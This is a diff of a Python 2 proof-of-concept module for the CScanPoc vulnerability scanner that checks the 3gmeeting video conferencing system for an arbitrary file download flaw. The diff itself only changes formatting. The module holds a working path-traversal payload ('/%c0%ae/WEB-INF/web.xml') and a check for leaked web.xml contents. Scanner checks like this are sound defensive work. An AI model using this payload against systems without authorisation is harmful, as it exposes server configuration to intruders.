@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = '3gmeeting_0001'  # 平台漏洞编号，留空
     name = '3gmeeting视讯系统任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         3gmeeting视讯系统 /%c0%ae/WEB-INF/web.xml 任意文件下载漏洞。
@@ -18,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '3gmeeting'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'cf0d2373-7943-40af-9646-ec71d0d09b09'
@@ -38,7 +41,6 @@ class Poc(ABPoc):
             payload = arg + '/%c0%ae/WEB-INF/web.xml'
             code, head, res, err, _ = hh.http(payload)
 
-
             if code == 200 and '<servlet-mapping>' in res and '<servlet-name>' in res:
                 #security_hole('Arbitrarily file download: '+payload)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -46,8 +48,10 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.verify()
+
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
